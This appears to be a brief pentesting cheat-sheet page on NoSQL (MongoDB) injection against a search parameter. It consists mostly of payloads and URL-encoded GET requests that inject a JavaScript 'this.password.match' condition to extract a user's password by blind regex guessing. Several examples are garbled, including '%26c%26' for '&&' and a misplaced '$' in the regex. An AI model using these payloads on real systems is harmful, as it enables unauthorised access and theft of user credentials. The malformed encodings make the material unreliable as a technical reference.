# DB queries

## DB queries

### Search for users 

Example: `GET /?search=admin`

**payload** 

`' && this.password.match(/.*)%00`

### Encoded request 

`GET /?search=admin'%20%26c%26%20this.password.match(/.*)%00`

which will return a True value \(200 code, valid request\).

* If the password is aaaaab, we can try the following regex :

`/^a.*$`

`GET /?search=admin'%20%26c%26%20this.password.match(/^a.$*)%00`

**Note**

Since the password doesn't maybe exist, we need to ensure that it exists using :

`&& this.password && this.password.match(`

### Resource

{% embed url="https://docs.mongodb.com/manual/tutorial/getting-started/" %}





